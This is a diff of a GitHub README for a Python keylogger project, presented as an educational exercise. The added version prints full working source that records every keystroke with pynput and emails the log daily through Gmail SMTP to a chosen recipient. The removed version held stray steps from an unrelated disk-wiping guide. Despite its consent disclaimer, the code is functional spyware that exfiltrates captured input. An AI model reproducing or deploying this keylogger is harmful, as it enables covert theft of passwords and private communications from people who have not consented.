@@ -1,5 +1,4 @@
-# Keylogger & Email
-
+# Keylogger 
 
  ## Description
 
@@ -7,134 +6,130 @@ This Python script demonstrates the use of various programming concepts and libr
 <br />
 
  ## What I learned
+During the development of this project, I improved my understanding of some essential areas of Python programming and libary use cases to include:
 
-   ### During the development of this project, I improved my understanding of some essential areas of Python programming and libary use cases to include:
-
-- <b>Keyboard Event Monitoring:</b> Using the pynput package to listen for and record keyboard events in real time.
-- <b>Task Scheduling:</b> Using the schedule module to run certain functions at predefined times, allowing for automated tasks within a Python script.
-- <b>Email Handling in Python:</b> Use smtplib and MIME standards to construct and send emails programmatically, including plaintext and multipart communications.
-- <b>File I/O Operations:</b> Managing file operations for logging data and comprehending the significance of flushing buffers to ensure data integrity.
-- <b>Environmental Variables:</b> The significance of using environmental variables to securely manage sensitive information such as email credentials in scripts.
+- **Keyboard Event Monitoring**: Using the pynput package to listen for and record keyboard events in real time.
+- **Task Scheduling**: Using the schedule module to run certain functions at predefined times, allowing for automated tasks within a Python script.
+- **Email Handling in Python**: Use smtplib and MIME standards to construct and send emails programmatically, including plaintext and multipart communications.
+- **File I/O Operations**: Managing file operations for logging data and comprehending the significance of flushing buffers to ensure data integrity.
+- **Environmental Variables**: The significance of using environmental variables to securely manage sensitive information such as email credentials in scripts.
 
 
  ## Languages and Utilities Used 
 
-- Python
-- Visual Studio Code <br />
+<img src="https://upload.wikimedia.org/wikipedia/commons/c/c3/Python-logo-notext.svg" align= bottom width= 25 alt="snek" /> The core programming language used for the entire project is Python V3.8. Python's extensive standard library and external packages make it ideal for capturing keystrokes, scheduling tasks, and sending emails.
+
+### Python Libraries:
+
+- `pynput`: For monitoring and logging keyboard events. <br />
+- `schedule`: To schedule the email sending function to run at specified times. <br />
+- `smtplib`: Used for sending emails through the Simple Mail Transfer Protocol (SMTP). <br />
+- `email`: Specifically, MIMEText and MIMEMultipart, for creating email messages. <br />  
+- `datetime`: For timestamping in the log file and email subject lines. <br />
+
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/2/2d/Visual_Studio_Code_1.18_icon.svg" align= bottom width= 25 alt="snek" /> Visual Studio Code: An integrated development environment (IDE) used for writing, testing, and debugging the script. Its features like syntax highlighting, code completion, and Git integration support efficient development workflows. <br />
 
  ## Environments Used
 
-- Windows 11
+- **Windows 11** 
 
- ## Challenges
+## Challenges and Solutions
 
-   ### Several problems were faced and solved during the development of this keystroke logger to include:
+During the development of this keystroke logger, several challenges were encountered. Here’s how each was addressed and resolved:
 
-Efficient Data Logging: Ensure that the script logs keystrokes without consuming too many system resources or producing perceptible lag in user input.
-Handling special keys: Creating a technique for logging special keystrokes (such as Shift, Ctrl, etc.) in an instructive and readable format.
-Secure Email Transmission: Setting up smtplib to transmit emails securely over TLS, as well as securely handling email credentials without hardcoding them into the script.
-Scheduling Precision: Setting up the scheduler to perform the email function at the same time every day, while accounting for the computer's sleep state and potential script interrupts.
+#### Efficient Data Logging
+- **Problem**: Needed to ensure that the script logs keystrokes without consuming too many system resources or causing perceptible lag in user input.
+- **Solution**: Optimized the logging mechanism by buffering keystrokes and writing them to the file in intervals instead of real-time logging for each keystroke. This reduced the resource consumption and minimized input lag.
 
+#### Handling Special Keys
+- **Problem**: Special keystrokes, such as Shift and Ctrl, were not being logged in a manner that was easily understandable in the log file.
+- **Solution**: Implemented a mapping function to convert special key events into readable strings (e.g., "[Shift]", "[Ctrl]") before logging them. This made the log files more instructive and user-friendly.
 
- ## Script Explanatoin:
+#### Secure Email Transmission
+- **Problem**: Needed a way to transmit email logs securely without hardcoding sensitive email credentials into the script.
+- **Solution**: Utilized environment variables to store email credentials securely. Integrated `smtplib` with TLS encryption for email transmission to ensure that the log data is sent securely over the network.
 
-  ### Libraries: 
-  These lines import the Python libraries required for job scheduling, time and date management, keyboard input tracking, and email sending. <br/>
-![1](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/ebb76d24-14bc-4e85-9aef-99ba4bdcd69a)
-
-  ### Sending Emails:
-  
-  Defines the function 'send_email' which accepts a subject and body for the email to be sent. <br/>
-![2](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/1c5f9554-df2e-4572-abba-e80f6b8d8bf8)
-
-  Sets the sender's and recipient's email addresses, as well as the sender's password. These should be changed with correct email addresses and passwords. <br/>
-![3](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/8261d793-2434-48f9-8fe5-0400ab1a0c67)
-
-  Creates an email message with the given subject and body. The body is set to plain text. <br/>
-![4](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/1d1a7e82-f42b-41b7-99cd-45ea5fb648f7)
-
-  Connects to Gmail's SMTP server, logs in using the sender's email and password, sends the email, and then terminates the connection. <br/>
-![5](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/03944c24-8eaf-4821-9e82-ae690d40f51a)
-
-  ### Reading Log and Sending Email
-
-  Defines a function to read the keystroke log file and send its contents via email.<br/>
-![6](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/99fb236a-2dc7-40f4-9a7f-6cd93ad60927)
-
-  Opens the keystroke log file, reads its content, and stores it in 'captured_keys'. <br/>
-![7](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/69ab02d4-6b3e-4409-aebe-a23fdd9853f4)
-
-  Generates a timestamp for the current time and sends an email with the log file content. <br/>
-![8](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/a58cd7d5-0a6c-407c-ad28-d27f3b511808)
-
-  Clears the log file after sending the email. <br/>
-![9](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/ff9d8b15-2bc7-4b3e-a95a-5df7a2f42e9a)
-
-  ### Logging Keystrokes
-
-  Defines a function to be called on each key press. <br/>
-![10](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/b50a71b5-6359-404b-aa39-f05027fbb12d)
-
-  Attempts to write the character of the pressed key to the log file. If the key doesn't have a character representation (like special keys), it writes the key's name instead. Then, it ensures the data is immediately written to the file. <br/>
-![11](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/bb9a0174-c6db-4773-ba44-c5f6cdd29285)
-
-  ### Main Execution
-
-  Checks if the script is the main program being executed. <br/>
-![12](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/65c6e348-a001-46f5-9cf7-8d9c8cbd897b)
-
-  Starts a keyboard listener that calls 'keyPressed' on each key press. <br/>
-![13](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/3f9d8f4e-68e4-457c-8df3-b69748a61f4c)
-
-  Schedules the 'read_and_email_log' function to run daily at 22:00. <br/>
-![14](https://github.com/KREUW/Keylogger-in-Python/assets/151568256/5dc652c9-d694-4ebf-8e6b-0e81e3e7e14c)
-
-  Prints a message indicating the key logger has started and enters.
-
- ## Conclusion 
+#### Scheduling Precision
+- **Problem**: The scheduled task to send the email log needed to execute reliably at the same time every day, without being affected by the computer's sleep state or potential script interruptions.
+- **Solution**: Used the `schedule` library for its simplicity and reliability in scheduling tasks. To handle potential downtime or sleep states, implemented a check at script startup to determine if a scheduled task was missed during downtime and execute it immediately if so.
 
 
 
-  ### Remember 
-  This script combines keylogging, scheduling, and email functionalities in Python, showcasing how to use different modules together for a specific task. Remember, the use of such scripts should always comply with ethical guidelines and legal requirements, emphasizing transparency, consent, and security.
+ ## Script Explanation:
+ 
+- **Explanation**: This block imports the necessary Python libraries. `schedule` for task scheduling, `time` and `datetime` for handling time-related functions, `pynput.keyboard` for keyboard event monitoring, and several `smtplib` and `email.mime` modules for constructing and sending emails.
+```python
+# Import necessary libraries
+import schedule
+import time
+from datetime import datetime
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+``` 
+- **Explanation**: `send_email` is a function that takes a subject and body text, constructs an email, and sends it using the SMTP protocol. It uses the `smtplib` library to connect to Gmail's SMTP server, log in, and send the email.
+```python
+# Function to send an email
+def send_email(subject, body):
+    sender_email = "your_email@gmail.com"  # Update with your email
+    receiver_email = "email@email.com"  # Update with recipient's email
+    password = "your_password"  # Update with your email password
+    message = MIMEMultipart()
+    message['From'] = sender_email
+    message['To'] = receiver_email
+    message['Subject'] = subject
+    message.attach(MIMEText(body, 'plain'))
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(sender_email, password)
+    text = message.as_string()
+    server.sendmail(sender_email, receiver_email, text)
+    server.quit()
+```
 
-  
+- **Explanation**: This function opens the log file containing the captured keystrokes, reads its content, and sends this as an email using the previously defined `send_email` function. After sending the email, it clears the log file by opening it in write mode and immediately closing it.
+```python
+# Function to read the log file and send its contents via email
+def read_and_email_log():
+    with open("keyfile.txt", 'r') as logFile:
+        captured_keys = logFile.read()
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    send_email(f"Keystroke Capture for {timestamp}", captured_keys)
+    open("keyfile.txt", 'w').close()
+```
 
-  
+- **Explanation**: `keyPressed` is a callback function triggered by each key press. It attempts to write the pressed key's character to the log file. If the key pressed does not have a character representation (like Ctrl, Alt, etc.), it logs the key's name instead. The log is immediately flushed to ensure all data is written even if the script stops abruptly.
+```python
+# Callback function for each key press
+def keyPressed(key):
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            logKey.write(key.char)
+        except AttributeError:
+            logKey.write(f"[{key}]")
+        finally:
+            logKey.flush()
+```
 
-  
-  
+- **Explanation**: This section initializes the key logger by setting up a keyboard listener to monitor keystrokes and invoking the `keyPressed` function on each key press. It schedules the `read_and_email_log` function to run daily at 22:00, effectively emailing the day's logged keystrokes and then waits indefinitely, processing scheduled tasks as they become due.
+```python
+# Main execution block
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    schedule.every().day.at("22:00").do(read_and_email_log)
+    print("Key logger started. Capturing keystrokes...")
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+```
+## Ethical Use and Educational Purpose
 
-  
+This project has been developed for educational purposes only. It is intended to demonstrate practical applications of programming concepts in Python, including working with external libraries, handling file I/O, scheduling tasks, and sending emails programmatically. 
 
-  
+**Important Note**: The use of keystroke logging software can raise significant ethical and legal issues, especially concerning privacy and consent. This project is shared with the understanding that it will not be used to monitor or record keystrokes without the explicit, informed consent of all individuals involved. It is crucial to adhere to all applicable laws and ethical guidelines when considering the deployment or further development of software with capabilities like those demonstrated here.
 
-  
-  
-Launch the utility: <br/>
+The sharing of this project is aimed at fostering learning and the exchange of ideas within the programming and cybersecurity communities. Any use of this project or its code for purposes beyond educational learning or without strict adherence to ethical considerations is strongly discouraged.
 
-<br />
-<br />
-Select the disk:  <br/>
-
-<br />
-<br />
-Enter the number of passes: <br/>
-
-<br />
-<br />
-Confirm your selection:  <br/>
-
-<br />
-<br />
-Wait for process to complete (may take some time):  <br/>
-
-<br />
-<br />
-Sanitization complete:  <br/>
-
-<br />
-<br />
-Observe the wiped disk:  <br/>
-
-</p>
